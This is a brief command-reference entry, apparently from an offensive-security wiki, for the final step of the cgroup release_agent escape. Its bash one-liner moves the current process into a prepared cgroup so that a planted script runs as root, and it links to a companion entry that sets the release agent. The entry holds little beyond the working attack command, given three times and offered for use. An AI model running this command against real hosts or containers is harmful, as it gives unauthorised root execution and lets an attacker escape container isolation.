---
data: sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
tags:
  - cgroup
type: command
executor: bash
platforms:
  - Linux
id: b77eea9e-0981-425d-83b4-de8589156505
created_at: '2025-12-14T04:08:48.012Z'
updated_at: '2025-12-14T04:08:48.012Z'
verified: false
validated: true
submitted: true
---
# Trigger Cgroup Execution

## Command

```bash
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

## Description

Moves current process to cgroup, triggering root script execution.

## Parameters

None.

## Examples

### Basic Usage

```bash
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

## Expected Output

Script runs as root.

## Related

- [[commands/set-cgroup-release-agent]]
